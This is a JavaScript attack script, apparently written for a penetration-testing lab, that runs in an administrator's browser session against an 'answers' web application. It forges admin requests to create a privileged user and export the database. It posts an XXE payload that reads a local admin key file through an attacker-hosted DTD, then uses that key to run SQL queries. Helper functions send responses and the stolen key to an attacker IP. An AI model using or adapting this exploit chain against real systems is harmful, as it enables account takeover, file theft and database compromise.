const attacker_ip = '192.168.119.131';
/*var h1s = document.getElementsByTagName("h1");
fetch(`http://${attacker_ip}/`+h1s[1].textContent, {});
*/
const host = 'answers'
const host_ip = '192.168.131.251'
/*
username = "wiggles1234"
email = "wiggles1234@email.com"
isAdmin = "true"
isMod = "true"
let config = {
      "method":"POST",
      "credentials":"include",
      mode: "cors",
      headers: {
            "Content-Type": "application/x-www-form-urlencoded"
      },
      body: "name=" + encodeURIComponent(username) + "&email=" + encodeURIComponent(email) + "&isAdmin=" + encodeURIComponent(isAdmin) + "&isMod=" + encodeURIComponent(isMod)
  };

  /// Create an Admin user and seed values to crack the users password
let start = Date.now();
doRequest(`http://${host_ip}/admin/users/create`, config);
let end = Date.now();

fetch(`http://${attacker_ip}/?start_time=` + start, {
  mode: "cors",
});

fetch(`http://${attacker_ip}/?end_time=` + end, {
  mode: "cors",
});

// Export the DataBase
config = {
  "method":"GET",
  "credentials":"include",
  mode: "cors",
  headers: {
        "Content-Type": "application/xml"
  },
};
doRequest(`http://${host_ip}/admin/export`, config);
*/
// Import Data into the database
let xmldata = `
<!DOCTYPE data [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///home/student/adminkey.txt" >
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://192.168.119.131/wrapper.dtd" >
  %dtd;
  ]>
  <database><categories><category><name>&wrapper;</name></category></categories></database>
`;
config = {
  "method":"POST",
  "credentials":"include",
  mode: "cors",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  }, 
  body:  "preview=true&xmldata="+ encodeURIComponent(xmldata)
};
let query = 'select version();'
runQuery(`http://${host_ip}/admin/import`, config, query);





// Helper Functions
// very basic
function doRequest(endpoint, cfg) {
  fetch(endpoint, cfg).then(async (response) => {
      fetch(`http://${attacker_ip}/?endpoint=` + endpoint, {
        mode: "cors",
      });   
      fetch(`http://${attacker_ip}/?status_code=` + response.status, {
        mode: "cors",
      });
    if(response.status < 400) {
      let data = await response.text();
      fetch(`http://${attacker_ip}/?exfil=` + data.length, {
        mode: "cors",
      });
    }
  }).catch((error) => {
       fetch(`http://${attacker_ip}/?error=` + error, {
        mode: "cors",
      });   
  });
}
// applies uri encoding to exfiltrated data
function doRequest1(endpoint, cfg) {
  fetch(endpoint, cfg).then(async (response) => {
      fetch(`http://${attacker_ip}/?endpoint=` + endpoint, {
        mode: "cors",
      });   
      fetch(`http://${attacker_ip}/?status_code=` + response.status, {
        mode: "cors",
      });
    if(response.status < 400) {
      let data = await response.text();
      fetch(`http://${attacker_ip}/?exfil=` + encodeURIComponent(data), {
        mode: "cors",
      });
    }
  }).catch((error) => {
       fetch(`http://${attacker_ip}/?error=` + error, {
        mode: "cors",
      });   
  });
}
// applied uri encoding and a regex to the exfiltrated data
function doRequest2(endpoint, cfg, regex) {
  fetch(endpoint, cfg).then(async (response) => {
      fetch(`http://${attacker_ip}/?endpoint=` + endpoint, {
        mode: "cors",
      });   
      fetch(`http://${attacker_ip}/?status_code=` + response.status, {
        mode: "cors",
      });
    if(response.status < 400) {
      let data = await response.text();
      var exfil = data.match(regex)[0];
      fetch(`http://${attacker_ip}/?exfil=` + encodeURIComponent(exfil), {
        mode: "cors",
      });
    }
  }).catch((error) => {
       fetch(`http://${attacker_ip}/?error=` + error, {
        mode: "cors",
      });   
  });
}


function runQuery(endpoint, cfg, query) {
  fetch(endpoint, cfg).then(async (response) => {
      fetch(`http://${attacker_ip}/?endpoint=` + endpoint, {
        mode: "cors",
      });   
      fetch(`http://${attacker_ip}/?status_code=` + response.status, {
        mode: "cors",
      });
    if(response.status < 400) {
      let data = await response.text();
      const re = /<!\[CDATA\[.*\s\]\]>/
      var key = data.match(re)[0];
      key = key.replace(/<!\[CDATA\[/,'');
      key = key.replace(/\s]]>/,'');
      fetch(`http://${attacker_ip}/?exfil=` + encodeURIComponent(key), {
        mode: "cors",
      });
      let cfg_n = {
        "method":"POST",
        "credentials":"include",
        mode: "cors",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        }, 
        body: `adminKey=${key}&query=${query}`
      }
      doRequest2(`http://${host_ip}/admin/query`, cfg_n, /<pre>.*\s\S.*\s\S\/pre>/);
    }
  }).catch((error) => {
       fetch(`http://${attacker_ip}/?error=` + error, {
        mode: "cors",
      });   
  });
}